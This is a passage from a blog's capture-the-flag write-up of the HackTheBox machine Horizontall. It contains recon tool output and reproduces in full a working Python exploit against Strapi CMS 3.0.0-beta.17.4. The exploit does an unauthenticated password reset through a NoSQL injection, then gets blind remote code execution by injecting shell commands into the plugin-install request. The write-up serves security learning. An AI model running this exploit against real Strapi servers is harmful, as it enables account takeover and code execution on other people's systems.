@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon：12345Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 03:37:03 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 22&#x2F;tcp on 10.10.11.105Discovered">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Horizontall">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Horizontall/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="Recon：12345Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-17 03:37:03 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 22&#x2F;tcp on 10.10.11.105Discovered">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517114731091.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517121856344.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517122249151.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517123453787.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517132208419.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220517135837450.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.877Z">
+<meta property="article:modified_time" content="2022-07-09T08:08:32.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/image-20220517114731091.png">
+  
+  
+  
+  <title>HackTheBox-Horizontall - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Horizontall"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          19k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          157 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Horizontall</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-17 03:37:03 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 22/tcp on 10.10.11.105<br>Discovered open port 80/tcp on 10.10.11.105 <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> horizontall.htb (10.10.11.105)<br>Host is up (0.16s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:<span class="hljs-built_in">cd</span>:ff:6b:0d:d5 (RSA)<br>|   256 3a:d5:89:d5:da:95:59:d9:<span class="hljs-built_in">df</span>:01:68:37:ca:d5:10:b0 (ECDSA)<br>|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)<br>80/tcp open  http    nginx 1.14.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://horizontall.htb<br>|_http-server-header: nginx/1.14.0 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.16 seconds<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://horizontall.htb<br><br>http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]<br></code></pre></td></tr></table></figure>
+
+<p>页面没有任何内容，所见非真：</p>
+<img src="https://www.worldisend.com/img/image-20220517114731091.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517114731091" style="zoom:200%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://horizontall.htb<br><br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaictheory/.dirsearch/reports/horizontall.htb/_22-05-17_11-43-09.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_11-43-09.<span class="hljs-built_in">log</span><br><br>Target: http://horizontall.htb/<br><br>[11:43:10] Starting: <br>[11:43:12] 301 -  194B  - /js  -&gt;  http://horizontall.htb/js/<br>[11:43:51] 301 -  194B  - /css  -&gt;  http://horizontall.htb/css/<br>[11:43:56] 200 -    4KB - /favicon.ico<br>[11:44:01] 301 -  194B  - /img  -&gt;  http://horizontall.htb/img/<br>[11:44:02] 200 -  901B  - /index.html<br>[11:44:03] 403 -  580B  - /js/<br></code></pre></td></tr></table></figure>
+
+<p>这个站点像是一个谎言，我应该寻找其他站点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; gobuster vhost -u http://horizontall.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t200<br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:          http://horizontall.htb/<br>[+] Method:       GET<br>[+] Threads:      200<br>[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt<br>[+] User Agent:   gobuster/3.1.0<br>[+] Timeout:      10s<br>===============================================================<br>2022/05/17 12:09:46 Starting gobuster <span class="hljs-keyword">in</span> VHOST enumeration mode<br>===============================================================<br>Found: api-prod.horizontall.htb (Status: 200) [Size: 413]<br>                                                         <br>===============================================================<br>2022/05/17 12:11:17 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://api-prod.horizontall.htb/                                                                                                    <br>http://api-prod.horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Strict-Transport-Security[max-age=31536000; includeSubDomains], Title[Welcome to your API], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[Strapi &lt;strapi.io&gt;], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.14.0]<br></code></pre></td></tr></table></figure>
+
+<p>Strapi cms.页面也很简单，只有一条欢迎语句：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html">&gt;&gt; curl http://api-prod.horizontall.htb/<br><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Welcome to your API<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Welcome.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dirsearch -u http://api-prod.horizontall.htb<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/mosaictheory/.dirsearch/reports/api-prod.horizontall.htb/_22-05-17_12-15-04.txt<br><br>Error Log: /home/mosaictheory/.dirsearch/logs/errors-22-05-17_12-15-04.<span class="hljs-built_in">log</span><br><br>Target: http://api-prod.horizontall.htb/<br><br>[12:15:04] Starting: <br>[12:15:18] 200 -  854B  - /ADMIN<br>[12:15:18] 200 -  854B  - /Admin<br>[12:15:18] 200 -  854B  - /Admin/login/<br>[12:15:23] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[12:15:53] 200 -    1KB - /favicon.ico<br>[12:15:58] 200 -  413B  - /index.html<br>[12:16:17] 200 -  121B  - /robots.txt<br>[12:16:17] 200 -  507B  - /reviews<br><br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220517121856344.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517121856344" style="zoom:200%;" />
+
+<img src="https://www.worldisend.com/img/image-20220517122249151.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517122249151" style="zoom:200%;" />
+
+<p>我需要想方法获取Strapi的版本，在源码中会有这么一串提示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">A lot of magic happens <span class="hljs-keyword">in</span> this file. HtmlWebpackPlugin automatically includes all assets (e.g. bundle.js, main.css) with the correct HTML tags, <span class="hljs-built_in">which</span> is why they are missing <span class="hljs-keyword">in</span> this HTML file. Don<span class="hljs-string">&#x27;t add any assets here! (Check out webpackconfig.js if you want to know more)  </span><br></code></pre></td></tr></table></figure>
+
+<img src="https://www.worldisend.com/img/image-20220517123453787.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220517123453787" style="zoom:200%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit strapi 3.0.0-beta.17.4<br>--------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                             |  Path<br>--------------------------------------------------------------------------- ---------------------------------<br>Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py<br>Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)   | nodejs/webapps/50716.rb<br>--------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><br>&gt;&gt; searchsploit -m multiple/webapps/50239.py<br>  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)<br>      URL: https://www.exploit-db.com/exploits/50239<br>     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py<br>File Type: Python script, ASCII text executable<br><br>Copied to: /home/mosaictheory/50239.py<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)</span><br><span class="hljs-comment"># Date: 2021-08-30</span><br><span class="hljs-comment"># Exploit Author: Musyoka Ian</span><br><span class="hljs-comment"># Vendor Homepage: https://strapi.io/</span><br><span class="hljs-comment"># Software Link: https://strapi.io/</span><br><span class="hljs-comment"># Version: Strapi CMS version 3.0.0-beta.17.4 or lower</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04</span><br><span class="hljs-comment"># CVE : CVE-2019-18818, CVE-2019-19609</span><br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> cmd <span class="hljs-keyword">import</span> Cmd<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Wrong number of arguments provided&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Usage: python3 exploit.py &lt;URL&gt;\n&quot;</span>)<br>    sys.exit()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Terminal</span>(<span class="hljs-title class_ inherited__">Cmd</span>):<br>    prompt = <span class="hljs-string">&quot;$&gt; &quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>(<span class="hljs-params">self, args</span>):<br>        code_exec(args)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_version</span>():<br>    <span class="hljs-keyword">global</span> url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Checking Strapi CMS Version running&quot;</span>)<br>    version = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/admin/init&quot;</span>).text<br>    version = json.loads(version)<br>    version = version[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;strapiVersion&quot;</span>]<br>    <span class="hljs-keyword">if</span> version == <span class="hljs-string">&quot;3.0.0-beta.17.4&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Version mismatch trying the exploit anyway&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">password_reset</span>():<br>    <span class="hljs-keyword">global</span> url, jwt<br>    session = requests.session()<br>    params = &#123;<span class="hljs-string">&quot;code&quot;</span> : &#123;<span class="hljs-string">&quot;$gt&quot;</span>:<span class="hljs-number">0</span>&#125;,<br>            <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;SuperStrongPassword1&quot;</span>,<br>            <span class="hljs-string">&quot;passwordConfirmation&quot;</span> : <span class="hljs-string">&quot;SuperStrongPassword1&quot;</span><br>            &#125;<br>    output = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/admin/auth/reset-password&quot;</span>, json = params).text<br>    response = json.loads(output)<br>    jwt = response[<span class="hljs-string">&quot;jwt&quot;</span>]<br>    username = response[<span class="hljs-string">&quot;user&quot;</span>][<span class="hljs-string">&quot;username&quot;</span>]<br>    email = response[<span class="hljs-string">&quot;user&quot;</span>][<span class="hljs-string">&quot;email&quot;</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;jwt&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> output:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Password reset unsuccessfull\n[-] Exiting now\n\n&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Password reset was successfully\n[+] Your email is: <span class="hljs-subst">&#123;email&#125;</span>\n[+] Your new credentials are: <span class="hljs-subst">&#123;username&#125;</span>:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: <span class="hljs-subst">&#123;jwt&#125;</span>\n\n&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code_exec</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">global</span> jwt, url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don&#x27;t expect to see output&quot;</span>)<br>    headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span> : <span class="hljs-string">f&quot;Bearer <span class="hljs-subst">&#123;jwt&#125;</span>&quot;</span>&#125;<br>    data = &#123;<span class="hljs-string">&quot;plugin&quot;</span> : <span class="hljs-string">f&quot;documentation &amp;&amp; $(<span class="hljs-subst">&#123;cmd&#125;</span>)&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span> : <span class="hljs-string">&quot;1337&quot;</span>&#125;<br>    out = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/admin/plugins/install&quot;</span>, json = data, headers = headers)<br>    <span class="hljs-built_in">print</span>(out.text)<br><br><span class="hljs-keyword">if</span> __name__ == (<span class="hljs-string">&quot;__main__&quot;</span>):<br>    url = sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> url.endswith(<span class="hljs-string">&quot;/&quot;</span>):<br>        url = url[:-<span class="hljs-number">1</span>]<br>    check_version()<br>    password_reset()<br>    terminal = Terminal()<br>    terminal.cmdloop()<br></code></pre></td></tr></table></figure>
+
